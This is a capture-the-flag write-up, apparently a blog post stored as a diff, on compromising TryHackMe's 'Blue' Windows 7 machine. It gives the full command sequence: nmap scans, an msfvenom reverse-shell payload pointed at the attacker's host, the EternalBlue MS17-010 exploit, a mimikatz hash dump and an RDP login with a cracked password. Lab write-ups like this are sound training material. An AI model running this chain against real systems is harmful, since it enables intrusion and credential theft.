@@ -1,0 +1,110 @@
+I" <p>Blue is a beginner-friendly Windows machine from tryhackme , where we exploit the famous eternalblue MS17-010 and dump NTLM hashes with mimikatz.</p>
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Running nmap :</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-o</span> nmap.txt 10.10.86.230
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+3389/tcp  open  tcpwrapped
+Service Info: Host: JON-PC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<p>We see that smb port is open, as the machine name is Blue it may hint that is vulnerable to Eternablue exploit, running nmap again to check it :</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nmap <span class="nt">-p445</span> <span class="nt">--script</span> vuln 10.10.86.230
+  Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-08-08 16:13 CEST
+  Nmap scan report <span class="k">for </span>10.10.86.230
+  Host is up <span class="o">(</span>0.040s latency<span class="o">)</span><span class="nb">.</span>
+
+  PORT    STATE SERVICE
+  445/tcp open  microsoft-ds
+  |_clamav-exec: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+
+  Host script results:
+  |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+  |_smb-vuln-ms10-054: <span class="nb">false</span>
+  |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+  | smb-vuln-ms17-010:
+  |   VULNERABLE:
+  |   Remote Code Execution vulnerability <span class="k">in </span>Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
+  |     State: VULNERABLE
+  |     IDs:  CVE:CVE-2017-0143
+  |     Risk <span class="nb">factor</span>: HIGH
+  |       A critical remote code execution vulnerability exists <span class="k">in </span>Microsoft SMBv1
+  |        servers <span class="o">(</span>ms17-010<span class="o">)</span><span class="nb">.</span>
+</code></pre></div></div>
+<p>Nmap reports that the machine is vulnerable to MS17-010 therefore we will use the following set of tools to exploit it : <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a>  with it we can create the shellcode, set up a listener and exploit the machine.</p>
+<h2 id="exploitation">Exploitation</h2>
+
+<p>We will generate the malicious shellcode using msfvenom:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.11.14.106 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> raw <span class="nt">-o</span> sc.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread
+</code></pre></div></div>
+<p>Now in order to obtain a shell we use the exploit contained in AutoBlue-MS17-010</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python eternalblue_exploit7 10.10.86.230 sc.bin
+</code></pre></div></div>
+
+<p>After running the exploit a few times we finally get a shell as nt authority\system</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.11.14.106] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.86.230] 49186
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+</code></pre></div></div>
+<h2 id="post-exploitation">Post-exploitation</h2>
+
+<p>Finally we will dump administrator hashes using mimikatz, this is a good post-exploitation practice for mantaining access to the machine</p>
+
+<p>Uploading mimikatz through smbserver:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py smbfolder <span class="nb">.</span>
+</code></pre></div></div>
+<p>In the victim machine :</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32&gt;copy <span class="se">\\</span>10.11.14.106<span class="se">\s</span>mbfolder<span class="se">\m</span>imikatz.exe
+copy <span class="se">\\</span>10.11.14.106<span class="se">\s</span>mbfolder<span class="se">\m</span>imikatz.exe
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+</code></pre></div></div>
+<p>Dumping hashes with mimikatz</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c">#18362 Mar  8 2020 18:30:37</span>
+ .## ^ <span class="c">##.  "A La Vie, A L'Amour" - (oe.eo)</span>
+ <span class="c">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+ <span class="c">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+ <span class="s1">'## v ##'</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
+  <span class="s1">'#####'</span>        <span class="o">&gt;</span> http://pingcastle.com / http://mysmartlogon.com   <span class="k">***</span>/
+
+mimikatz <span class="c"># lsadump::sam</span>
+Domain : JON-PC
+SysKey : 55bd17830e678f18a3110daf2c17d4c7
+Local SID : S-1-5-21-2633577515-2458672280-487782642
+
+SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e
+
+RID  : 000001f4 <span class="o">(</span>500<span class="o">)</span>
+User : Administrator
+  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
+
+RID  : 000001f5 <span class="o">(</span>501<span class="o">)</span>
+User : Guest
+
+RID  : 000003e8 <span class="o">(</span>1000<span class="o">)</span>
+User : Jon
+  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d
+</code></pre></div></div>
+<p>As port 3389 is open we can crack those hashes and login through rdp protocol using rdesktop</p>
+
+<p><img src="/assets/img/Blue/hash.png" alt="hash" /></p>
+
+<p>The administrator hash is a blank hash , but we were able to obtain Jon cracked password</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop 10.10.86.230 <span class="nt">-g</span> 80% <span class="nt">-u</span> Jon <span class="nt">-p</span> alqfna22
+</code></pre></div></div>
+<p>We login succesfully as Jon</p>
+
+<p><img src="/assets/img/Blue/rdp.png" alt="login" /></p>
+:ET
